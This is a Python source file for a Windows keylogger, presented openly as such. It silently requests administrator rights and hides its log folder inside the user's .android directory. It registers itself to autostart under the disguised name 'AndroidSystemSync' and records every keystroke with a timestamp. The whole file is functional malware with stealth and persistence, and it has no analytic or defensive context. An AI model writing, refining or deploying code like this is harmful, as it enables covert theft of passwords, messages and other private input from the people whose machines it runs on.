import os
import sys
import keyboard
import win32api
import win32con
import win32security
from datetime import datetime

# ELEVATE TO ADMIN ON STARTUP
def elevate_admin():
    if not win32security.IsUserAnAdmin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        shell32 = win32api.GetModuleHandle('shell32.dll')
        win32api.ShellExecute(0, 'runas', sys.executable, params, None, win32con.SW_HIDE)
        sys.exit(0)

# STEALTH FILE OPERATIONS
def create_log_file():
    target_dir = r"C:\Users\PC\.android"
    if not os.path.exists(target_dir):
        os.makedirs(target_dir, exist_ok=True)
        win32api.SetFileAttributes(target_dir, win32con.FILE_ATTRIBUTE_HIDDEN)
    return os.path.join(target_dir, "test")

# REGISTRY AUTOSTART PERSISTENCE
def install_persistence(log_path):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = win32api.RegOpenKeyEx(
            win32con.HKEY_CURRENT_USER,
            reg_path,
            0,
            win32con.KEY_WRITE | win32con.KEY_READ
        )
        win32api.RegSetValueEx(key, "AndroidSystemSync", 0, win32con.REG_SZ, f'"{sys.executable}" "{log_path}"')
        win32api.RegCloseKey(key)
    except Exception:
        pass

# KEYSTROKE CAPTURE ENGINE
def capture_keystrokes(log_file):
    def log_key(event):
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
            if event.name == 'space':
                f.write(' ')
            elif event.name == 'enter':
                f.write('\n')
            elif event.name == 'backspace':
                f.write(' [BS] ')
            elif len(event.name) > 1:
                f.write(f"[{event.name.upper()}]")
            else:
                f.write(event.name)

    keyboard.hook(log_key)
    keyboard.wait()

# MAIN EXECUTION FLOW
if __name__ == "__main__":
    elevate_admin()
    log_path = create_log_file()
    install_persistence(sys.argv[0])
    capture_keystrokes(log_path)